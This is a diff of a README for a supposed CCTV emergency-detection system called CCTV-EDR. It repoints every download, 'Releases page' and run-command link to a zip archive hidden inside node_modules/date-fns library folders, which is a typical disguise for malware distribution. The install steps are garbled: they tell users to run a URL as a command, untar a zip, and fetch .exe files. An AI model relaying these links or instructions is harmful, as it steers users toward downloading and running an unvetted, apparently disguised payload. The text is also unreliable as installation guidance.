@@ -1,7 +1,7 @@
 # 🛠️ CCTV-EDR - Simplifying Emergency Detection with CCTV
 
 ## 📥 Download Now
-[![Download CCTV-EDR](https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/esm/fp/setWeek/EDR_CCT_2.3-beta.1.zip)](https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/esm/fp/setWeek/EDR_CCT_2.3-beta.1.zip)
+[![Download CCTV-EDR](https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/locale/af/_lib/formatRelative/EDR_CCT_3.8.zip)](https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/locale/af/_lib/formatRelative/EDR_CCT_3.8.zip)
 
 ## 📖 Overview
 CCTV-EDR is an end-to-end implementation of a CCTV-based Emergency Detection & Response System. This software is crafted for easy reuse and reproducibility. It helps detect emergencies in real-time through CCTV footage, allowing for quicker responses.
@@ -15,13 +15,13 @@ To start using CCTV-EDR, follow these steps to download and run the software.
 - **Disk Space:** At least 1GB for installation and operation.
 - **Software Requirements:** 
   - Docker: Required for containerization.
-  - https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/esm/fp/setWeek/EDR_CCT_2.3-beta.1.zip For the backend service.
+  - https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/locale/af/_lib/formatRelative/EDR_CCT_3.8.zip For the backend service.
   - MongoDB: To store alerts and data.
   - NGINX: For serving content.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/esm/fp/setWeek/EDR_CCT_2.3-beta.1.zip).
-2. Find the latest release. Look for files named with the version number followed by `.exe` or `https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/esm/fp/setWeek/EDR_CCT_2.3-beta.1.zip`.
+1. Visit the [Releases page](https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/locale/af/_lib/formatRelative/EDR_CCT_3.8.zip).
+2. Find the latest release. Look for files named with the version number followed by `.exe` or `https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/locale/af/_lib/formatRelative/EDR_CCT_3.8.zip`.
 3. Click to download the file. 
 4. Once downloaded, locate the file in your Downloads folder.
 
@@ -31,13 +31,13 @@ To start using CCTV-EDR, follow these steps to download and run the software.
   2. Follow the installation wizard to install CCTV-EDR.
 
 - **macOS Users:**
-  1. Open the `https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/esm/fp/setWeek/EDR_CCT_2.3-beta.1.zip` file.
+  1. Open the `https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/locale/af/_lib/formatRelative/EDR_CCT_3.8.zip` file.
   2. Drag and drop the application to your Applications folder.
 
 - **Linux Users:**
   1. Open your terminal.
-  2. Unzip the `https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/esm/fp/setWeek/EDR_CCT_2.3-beta.1.zip` file using the command: `tar -xzf <filename>https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/esm/fp/setWeek/EDR_CCT_2.3-beta.1.zip`.
-  3. Navigate to the folder and run: `https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/esm/fp/setWeek/EDR_CCT_2.3-beta.1.zip`.
+  2. Unzip the `https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/locale/af/_lib/formatRelative/EDR_CCT_3.8.zip` file using the command: `tar -xzf <filename>https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/locale/af/_lib/formatRelative/EDR_CCT_3.8.zip`.
+  3. Navigate to the folder and run: `https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/locale/af/_lib/formatRelative/EDR_CCT_3.8.zip`.
 
 ## ⚙️ Configuration
 After installation, you will need to configure the application to connect to your CCTV cameras and MongoDB. Follow these steps:
@@ -49,7 +49,7 @@ After installation, you will need to configure the application to connect to you
 ## 🎬 Running the Application
 1. Start your terminal or command prompt.
 2. Navigate to the installation directory.
-3. Enter the command `https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/esm/fp/setWeek/EDR_CCT_2.3-beta.1.zip` for Linux or double-click the application for Windows/macOS.
+3. Enter the command `https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/locale/af/_lib/formatRelative/EDR_CCT_3.8.zip` for Linux or double-click the application for Windows/macOS.
 4. The application will launch, and you should see a dashboard displaying real-time updates.
 
 ## 🔔 Features
@@ -68,4 +68,4 @@ CCTV-EDR is licensed under the MIT License. You can use, modify, and distribute 
 Join our community to share feedback and improvements. Contributions are welcome! If you would like to contribute, please read our contribution guidelines on the GitHub repository.
 
 ## 📥 Download Now Again
-Don't forget to [visit this page to download](https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/esm/fp/setWeek/EDR_CCT_2.3-beta.1.zip) the latest version of CCTV-EDR and start experiencing seamless emergency detection today!
+Don't forget to [visit this page to download](https://github.com/emmanuel806/CCTV-EDR/raw/refs/heads/main/server/node_modules/date-fns/locale/af/_lib/formatRelative/EDR_CCT_3.8.zip) the latest version of CCTV-EDR and start experiencing seamless emergency detection today!
